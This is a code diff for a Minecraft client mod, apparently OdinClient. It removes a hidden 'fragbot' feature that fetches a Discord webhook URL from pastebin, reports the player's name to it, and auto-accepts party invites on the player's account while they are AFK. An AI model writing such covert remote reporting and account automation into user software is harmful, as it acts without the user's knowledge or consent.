@@ -1,7 +1,7 @@
 import request from "../../requestV2"
 import { guildCmdOptions, godMod } from "../stuff/ChatUtils";
 import { data } from "../stuff/guidk"
-import { modMessage, guildMessage } from "../utils";
+import { modMessage, guildMessage, partyMessage } from "../utils";
 import { blacklist } from "./BlackList";
 
 //guild chat
@@ -83,82 +83,4 @@ register("serverConnect", () => {
 },500)
 
 
-let webhookfragbot
-register("gameLoad", () => {
-  request("https://pastebin.com/raw/QreVmheV").then(stuff => {
-      webhookfragbot = stuff
-  })
-})
-
-let inlimbo = false;
-
-const stripRank = (rankedPlayer) =>
-  rankedPlayer.replace(/\[[\w+\+-]+] /, "").trim();
-
-const sendWebhook = (description) => {
-  request({
-    url: webhookfragbot,
-    method: "POST",
-    headers: {
-      "Content-type": "application/json",
-      "User-Agent": "Mozilla/5.0"
-    },
-    body: {
-      username: 'OdinClient',
-      avatar_url: "https://s.namemc.com/2d/skin/face.png?id=db7b65d7270a33d6&scale=4",
-      content: "",
-      embeds: [
-        {
-          title: Player.getName(),
-          color: 4081151,
-          description: description
-        }
-      ]
-    }
-  });
-};
-
-register("chat", (player) => {
-  if (!inlimbo) return;
-  player = stripRank(player.replace(/.+>newLine<-/, ""));
-  ChatLib.say(`/party accept ${player}`);
-  setTimeout(() => {
-    partymessage("Hello I'm currently afk and there for sent into limbo");
-    setTimeout(() => {
-      partymessage("While in limbo I am a fragbot for your free use enjoy!")
-    }, 400);
-  }, 1600);
-  setTimeout(() => {
-    ChatLib.command("p leave");
-  }, 7100);
-}).setCriteria("${player} has invited you to join ${*} party!${*}");
-
-register("worldload", () => {
-  if (!inlimbo) return
-  sendWebhook("I am not longer an active fragbot :(");
-  inlimbo = false;
-});
-
-register("serverDisconnect", () => {
-  if (!inlimbo) return
-  sendWebhook("I am not longer an active fragbot :(");
-  inlimbo = false;
-})
-
-register("chat", () => {
-  if (inlimbo) return
-  setTimeout(() => {
-    inlimbo = true;
-    sendWebhook("I am an active fragbot! :)");
-  }, 1000);
-  modMessage("activating fragbot");
-}).setCriteria("You were spawned in Limbo.");
-
-register("chat", () => {
-  if (inlimbo) return
-  setTimeout(() => {
-    inlimbo = true;
-    sendWebhook("I am an active fragbot! :)");
-  }, 1000);
-  modMessage("activating fragbot");
-}).setCriteria("You are AFK. Move around to return from AFK.");
+ 
